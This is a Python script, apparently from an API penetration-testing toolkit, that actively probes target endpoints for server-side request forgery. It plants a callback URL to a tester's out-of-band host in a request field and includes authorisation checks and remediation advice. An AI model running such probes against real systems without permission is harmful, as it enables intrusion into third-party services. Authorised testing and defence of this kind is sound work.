#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
api7_ssrf.py - OWASP API7:2023 Server Side Request Forgery

RUN THIS FILE ON ITS OWN:
  python3 api7_ssrf.py --target https://api.example.com \
      --paths /api/v1/import --auth "Bearer <token>" \
      --body-field url --oob-host your-collaborator-or-canary-domain.example \
      --active

--target is REQUIRED, no default. --active is ALSO required for this
script specifically (it does nothing passively, by design - SSRF cannot
be observed without making the target fetch something).

HOW CONFIRMATION WORKS
------------------------
This script does NOT include a built-in out-of-band collaborator server
(unlike the Burp edition, which can use Burp Collaborator). You must
supply --oob-host pointing at infrastructure YOU control that can tell
you whether an inbound HTTP request arrived (e.g. a Burp Collaborator
client, interactsh, webhook.site, or your own logging endpoint).

The script sends the target field pointing at
  http://<random-token>.<oob-host>/<random-token>
and prints the exact probe URL it used for each field it tried. You then
check your OOB listener for an interaction containing that token - a hit
there is a CONFIRMED SSRF with definitive proof (the target server made
an outbound request to attacker infrastructure). Without checking your
OOB listener, this script cannot and does not claim anything was found.
"""

import random
import string
import re
from common import (build_arg_parser, parse_args_smart, normalize_target, join_url,
                     default_headers, safe_request, parse_paths_arg,
                     Report, Finding, confirm_authorized)
from common import auto_export_json

DEFAULT_PATHS = ["/api/v1/import"]


def random_token(n=12):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def main():
    parser = build_arg_parser("API7:2023 Server Side Request Forgery - standalone checker (active-only)")
    parser.add_argument(
        "--body-field", default="url",
        help="JSON body field name to inject the SSRF probe URL into (default: 'url').")
    parser.add_argument(
        "--method", default="POST", choices=["POST", "PUT", "PATCH"],
        help="HTTP method for the request carrying the probe field (default: POST).")
    parser.add_argument(
        "--oob-host", default=None,
        help="REQUIRED for a meaningful result. Hostname of out-of-band "
             "infrastructure you control (Collaborator/interactsh/"
             "webhook.site/your own listener) to receive the callback.")
    args = parse_args_smart(parser)

    if not args.active:
        print("api7_ssrf.py performs no passive checks - SSRF cannot be "
              "observed without making the target fetch something. "
              "Re-run with --active.")
        return
    if not args.oob_host:
        print("--oob-host is required for a meaningful SSRF test. Without "
              "out-of-band infrastructure you control, there is no way to "
              "PROVE the server made the outbound request, so this script "
              "refuses to produce an unverifiable finding. Pass --oob-host "
              "pointing at your Collaborator/interactsh/webhook.site domain.")
        return

    base = normalize_target(args.target)
    paths = parse_paths_arg(args.paths, DEFAULT_PATHS)
    report = Report("API7 - Server Side Request Forgery", base)
    headers = default_headers(args.auth)

    confirm_authorized(base)

    for path in paths:
        url = join_url(base, path)
        token = random_token()
        probe_url = "http://%s.%s/%s" % (token, args.oob_host, token)
        body = {args.body_field: probe_url}

        resp, err = safe_request(args.method, url, headers=headers,
                                  json_body=body, timeout=args.timeout,
                                  verify=not args.insecure)
        if err:
            print("  [skip] %s -> %s" % (url, err))
            continue

        print(
            "  [sent] %s %s  field '%s' = %s  -> HTTP %s\n"
            "         Now check your OOB listener for a hit containing "
            "token '%s'. If it arrived, that's a CONFIRMED SSRF." %
            (args.method, url, args.body_field, probe_url, resp.status_code, token)
        )
        report.add(Finding(
            category="API7:2023",
            name="SSRF probe sent - manual OOB confirmation required",
            severity="Information", confidence="Tentative",
            detail=(
                "Sent field '%s'=%s to %s. Server responded HTTP %d. This "
                "finding is NOT a confirmed SSRF by itself - go check your "
                "OOB listener (%s) for an interaction carrying token '%s'. "
                "If one arrived, the target definitely made an outbound "
                "request to attacker-controlled infrastructure - that is "
                "the actual proof, not this HTTP response."
                % (args.body_field, probe_url, path, resp.status_code,
                   args.oob_host, token)
            ),
            remediation=(
                "Validate/allow-list outbound destinations server-side "
                "(scheme, host, IP range - block RFC1918/loopback/"
                "link-local); disable redirects on server-initiated "
                "fetches; isolate such fetches on a network segment with "
                "no access to internal services."
            ),
            method=args.method, url=url, status=resp.status_code,
            evidence="Probe URL: %s\nToken to search for in your OOB listener: %s" % (probe_url, token),
        ))

    report.summary()
    print("\nReminder: review your OOB listener NOW for interactions - this "
          "script cannot check that for you.")
    auto_export_json(report, 'api7_ssrf')  # ALWAYS saved to Desktop, no flag needed
    if args.export_md:
        report.export_md(args.export_md)


if __name__ == "__main__":
    main()
